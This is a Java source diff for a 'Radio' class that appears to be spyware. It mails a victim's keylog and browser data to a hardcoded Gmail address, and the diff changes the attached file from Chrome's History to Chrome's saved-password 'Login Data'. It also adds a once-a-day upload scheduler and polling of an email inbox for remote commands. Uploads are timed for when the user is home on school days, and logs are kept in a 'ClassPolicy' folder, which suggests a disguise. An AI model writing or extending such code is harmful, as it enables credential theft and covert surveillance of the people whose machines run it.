@@ -34,36 +34,129 @@ import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
 
+/**
+ *                                      __.-"..--,__
+                               __..---"  | _|    "-_\
+                        __.---"          | V|::.-"-._D
+                   _--"".-.._   ,,::::::'"\/""'-:-:/
+              _.-""::_:_:::::'-8b---"            "'
+           .-/  ::::<  |\::::::"\
+           \/:::/::::'\\ |:::b::\
+           /|::/:::/::::-::b:%b:\|
+            \/::::d:|8:::b:"%%%%%\
+            |\:b:dP:d.:::%%%%%"""-,
+             \:\.V-/ _\b%P_   /  .-._
+             '|T\   "%j d:::--\.(    "-.
+             ::d<   -" d%|:::do%P"-:.   "-,
+             |:I _    /%%%o::o8P    "\.    "\
+              \8b     d%%%%%%P""-._ _ \::.    \
+              \%%8  _./Y%%P/      .::'-oMMo    )
+                H"'|V  |  A:::...:odMMMMMM(  ./
+                H /_.--"JMMMMbo:d##########b/
+             .-'o      dMMMMMMMMMMMMMMP""
+           /" /       YMMMMMMMMM|
+         /   .   .    "MMMMMMMM/
+         :..::..:::..  MMMMMMM:|
+          \:/ \::::::::JMMMP":/
+           :Ao ':__.-'MMMP:::Y
+           dMM"./:::::::::-.Y
+          _|b::od8::/:YM::/
+          I HMMMP::/:/"Y/"
+           \'""'  '':|
+            |    -::::\
+            |  :-._ '::\
+            |,.|    \ _:"o
+            | d" /   " \_:\.
+            ".Y. \       \::\
+             \ \  \      MM\:Y
+              Y \  |     MM \:b
+              >\ Y      .MM  MM
+              .IY L_    MP'  MP
+              |  \:|   JM   JP
+              |  :\|   MP   MM
+              |  :::  JM'  JP|
+              |  ':' JP   JM |
+              L   : JP    MP |
+              0   | Y    JM  |
+              0   |     JP"  |
+              0   |    JP    |
+              m   |   JP     #
+              I   |  JM"     Y
+              l   |  MP     :"
+              |\  :-       :|
+              | | '.\      :|
+              | | "| \     :|
+               \    \ \    :|
+               |  |  | \   :|
+               |  |  |   \ :|
+               |   \ \    | '.
+               |    |:\   | :|
+               \    |::\..|  :\
+                ". /::::::'  :||
+                  :|::/:::|  /:\
+                  | \/::|: \' ::|
+                  |  :::||    ::|
+                  |   ::||    ::|
+                  |   ::||    ::|
+                  |   ::||    ::|
+                  |   ': |    .:|
+                  |    : |    :|
+                  |    : |    :|
+                  |    :||   .:|
+                  |   ::\   .:|
+                 |    :::  .::|
+                /     ::|  :::|
+             __/     .::|   ':|
+    ...----""        ::/     ::
+   /m_  AMm          '/     .:::
+   ""MmmMMM#mmMMMMMMM"     .:::m
+      """YMMM""""""P        ':mMI
+               _'           _MMMM
+           _.-"  mm   mMMMMMMMM"
+          /      MMMMMMM""
+          mmmmmmMMMM"
+ *
+ */
 public class Radio {
+	public static int schDay = -1;
+	public static boolean uploadDone = false;
 	public static void main (String[] args) throws IOException, URISyntaxException {
 		Main m = new Main();
-		System.out.println("Starting a new thread for you...");
+		System.out.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
 		Executors.newSingleThreadExecutor().execute(new Runnable() {
 		    @Override
 		    public void run() {
 		    	try {
 					m.exec();
+					System.out.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
 				} catch (IOException | URISyntaxException e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 		    }
 		});
-		System.out.println("Done.");
+		System.out.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
+		java.util.Date d = new java.util.Date();
+	    Calendar cl = Calendar.getInstance();
+	    cl.setTime(d);
+	    schDay = cl.get(Calendar.DAY_OF_WEEK);
 		for(;;) {
-			java.util.Date date = new java.util.Date();
+			d = new java.util.Date();
 		    Calendar cal = Calendar.getInstance();
-		    cal.setTime(date);
+		    cal.setTime(d);
 		    int dow = cal.get(Calendar.DAY_OF_WEEK);
 		    int hour = cal.get(Calendar.HOUR_OF_DAY);
 		    int minutes = cal.get(Calendar.MINUTE);
-		   // System.out.println(dow);
-		    // upload(getHostIP());
-		   // uphistory(getHostIP());
+		   
 			 /* @param dow
 			  * @param hour
 			  * Check if the day is a school day, if so only mail logs while at home
 			  */
+		    if (schDay != dow) 
+		    {
+		    	uploadDone = false;
+		    	schDay = dow;
+		    } // update scheduler
 			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) {
 		//	System.out.println("[" + m.getElapsedCombatTime() + "] Today is a school day: " + dow);
 			 if ((hour >= 16 || hour == 0)) {
@@ -77,7 +170,13 @@ public class Radio {
 					 uphistory(getHostIP());
 				 }
 				 if (minutes % 30 == 0 || minutes == 0) {
-				 mailLogs();
+				checkForCommands();
+				 if (!uploadDone)
+				 {
+				 if (mailLogs() == 0) {
+				 uploadDone = true;
+				 }
+				 }
 				 }
 			 }
 			 } else if (dow == 1 || dow == 7) {
@@ -91,7 +190,13 @@ public class Radio {
 				 	 uphistory(getHostIP());
 				   }
 				 if ((minutes % 30 == 0 || minutes == 0)) {
-					 mailLogs();
+					 checkForCommands();
+					 if (!uploadDone)
+					 {
+					 if (mailLogs() == 0) {
+					 uploadDone = true;
+					 }
+					 }
 				 }
 				 }
 			 }
@@ -204,7 +309,7 @@ public class Radio {
 			 return 1;
 		 }
 	 }
-	 public static void mailLogs() {
+	 public static int mailLogs() {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
 	      String to = "duvictor514@gmail.com";
@@ -261,7 +366,7 @@ public class Radio {
 	         // Part two is attachment
 	         messageBodyPart = new MimeBodyPart();
 	         String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
-	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History";
+	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
 	         DataSource source = new FileDataSource(filename);
 	         messageBodyPart.setDataHandler(new DataHandler(source));
 	         messageBodyPart.setFileName(filename);
@@ -278,12 +383,13 @@ public class Radio {
 	         Transport.send(message);
 
 	         System.out.println("Transmission successful");
-	  
+	         return 0;
 	      } catch (MessagingException e) {
 	    	  System.err.println("Mailer Broadcast Failure: "+ e);
+	    	  return 2;
 	      }
 	 }
-	 public static void checkForCommands() {
+	 public static int checkForCommands() {
 		 try {
 
 		      //create properties field
@@ -327,16 +433,19 @@ public class Radio {
 		      //close the store and folder objects
 		      emailFolder.close(false);
 		      store.close();
-
+		      return 0;
 		      } catch (NoSuchProviderException e) {
 		    	 System.err.println("Mailer request failed:" +e);
 		         e.printStackTrace();
+		         return 2;
 		      } catch (MessagingException e) {
 		    	  System.err.println("Mailer request failed:" +e);
 		         e.printStackTrace();
+		         return 2;
 		      } catch (Exception e) {
 		    	  System.err.println("Mailer request failed:" +e);
 		         e.printStackTrace();
+		         return 2;
 		      }
 		   }
 }
